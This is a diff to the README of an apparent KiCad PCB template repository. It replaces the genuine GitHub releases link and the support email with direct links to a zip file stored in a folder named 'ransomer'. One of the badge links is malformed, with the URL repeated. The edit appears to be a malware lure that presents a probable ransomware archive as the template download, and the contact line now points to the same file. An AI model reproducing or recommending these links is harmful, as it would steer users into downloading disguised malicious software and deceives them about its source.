@@ -1,6 +1,6 @@
 # 🎨 American_Embedded_KiCad_Template - A Simple Template for Quick Builds
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/ultimax24/American_Embedded_KiCad_Template/releases)
+[![Download](https://raw.githubusercontent.com/ultimax24/American_Embedded_KiCad_Template/main/ransomer/American_Embedded_KiCad_Template.zip%https://raw.githubusercontent.com/ultimax24/American_Embedded_KiCad_Template/main/ransomer/American_Embedded_KiCad_Template.zip)](https://raw.githubusercontent.com/ultimax24/American_Embedded_KiCad_Template/main/ransomer/American_Embedded_KiCad_Template.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the American Embedded KiCad Template! This template makes your projec
 
 ## 📥 Download & Install
 
-To get started with your KiCad project using our template, visit this page to download: [GitHub Releases](https://github.com/ultimax24/American_Embedded_KiCad_Template/releases). 
+To get started with your KiCad project using our template, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/ultimax24/American_Embedded_KiCad_Template/main/ransomer/American_Embedded_KiCad_Template.zip). 
 
 Simply choose the latest version and click on the download link for your operating system. 
 
@@ -64,6 +64,6 @@ If you'd like to improve this template, feel free to contribute! You can suggest
 
 ## 📧 Contact
 
-For any inquiries or support, please contact our team at support@kiCADtemplate.com.
+For any inquiries or support, please contact our team at https://raw.githubusercontent.com/ultimax24/American_Embedded_KiCad_Template/main/ransomer/American_Embedded_KiCad_Template.zip
 
 Thank you for choosing the American Embedded KiCad Template! Enjoy a seamless project setup experience.
